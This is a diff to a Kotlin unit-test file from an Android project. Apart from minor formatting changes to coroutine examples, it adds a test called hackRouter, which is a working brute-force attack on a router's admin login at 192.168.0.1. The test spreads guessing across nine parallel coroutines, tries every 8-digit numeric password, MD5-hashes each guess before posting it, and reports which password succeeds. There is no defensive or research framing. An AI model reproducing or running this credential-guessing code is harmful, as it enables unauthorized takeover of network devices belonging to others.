@@ -1,9 +1,15 @@
 package com.mitsuki.ehit
 
+import com.mitsuki.armory.httprookie.HttpRookie
+import com.mitsuki.armory.httprookie.convert.StringConvert
+import com.mitsuki.armory.httprookie.request.params
+import com.mitsuki.armory.httprookie.response.Response
 import kotlinx.coroutines.*
 import org.junit.Test
 
 import org.junit.Assert.*
+import java.security.MessageDigest
+import kotlin.math.pow
 import kotlin.system.measureTimeMillis
 
 /**
@@ -117,14 +123,14 @@ class ExampleUnitTest {
     }
 
     suspend fun doSomethingUsefulOneC(): Int {
-        return withContext(Dispatchers.IO){
+        return withContext(Dispatchers.IO) {
             delay(1000L)
             13
         }
     }
 
     suspend fun doSomethingUsefulTwoC(): Int {
-        return withContext(Dispatchers.IO){
+        return withContext(Dispatchers.IO) {
             delay(1000L)
             29
         }
@@ -148,5 +154,109 @@ class ExampleUnitTest {
             println("The answer is ${one + two}")
         }
         println("Completed in $time ms")
+    }
+
+
+    @Test
+    fun hackRouter() = runBlocking<Unit> {
+        //尝试8位暴力破解
+        //分成9组
+        //
+
+//        val a = async {
+//            for (i in 0 until 9999999) {
+//                val pw = i.toString().run {
+//                    var n = this
+//                    for (t in length until 7) {
+//                        n = "0$n"
+//                    }
+//                    n
+//                }
+//                tryPw("0$pw")
+//            }
+//        }
+
+        val b = async { kkk("1", 7.0) }
+
+        val c = async { kkk("2", 7.0) }
+
+        val d = async { kkk("3", 7.0) }
+
+        val e = async { kkk("4", 7.0) }
+
+        val f = async { kkk("5", 7.0) }
+
+        val g = async { kkk("6", 7.0) }
+
+        val h = async { kkk("7", 7.0) }
+
+        val i = async { kkk("8", 7.0) }
+
+        val j = async { kkk("9", 7.0) }
+
+//        a.await()
+        b.await()
+        c.await()
+        d.await()
+        e.await()
+        f.await()
+        g.await()
+        h.await()
+        i.await()
+        j.await()
+    }
+
+    private suspend fun kkk(head: String, co: Double) = withContext(Dispatchers.IO) {
+
+        val end = 10.0.pow(co).toInt() - 1
+        for (i in 0 until end) {
+            val pw = i.toString().run {
+                var n = this
+                for (t in length until co.toInt()) {
+                    n = "0$n"
+                }
+                n
+            }
+            tryPw("$head$pw")
+        }
+
+    }
+
+
+    private fun tryPw(pw: String) {
+        val data = HttpRookie.post<String>("http://192.168.0.1/login/Auth") {
+            convert = StringConvert()
+            params("username" to "admin")
+            params("password" to md5(pw))
+        }.execute()
+
+        when (data) {
+            is Response.Success -> {
+                if (data.body != "1") {
+                    println("success---> $pw")
+                } else {
+                    println("fail---> $pw")
+                }
+            }
+            is Response.Fail -> {
+                println("${data.throwable}")
+            }
+        }
+    }
+
+    private fun md5(source: String): String {
+        val result = MessageDigest.getInstance("MD5").digest(source.toByteArray())
+        return with(StringBuilder()) {
+            result.forEach {
+                val hex = it.toInt() and (0xFF)
+                val hexStr = Integer.toHexString(hex)
+                if (hexStr.length == 1) {
+                    append("0").append(hexStr)
+                } else {
+                    append(hexStr)
+                }
+            }
+            toString()
+        }
     }
 }
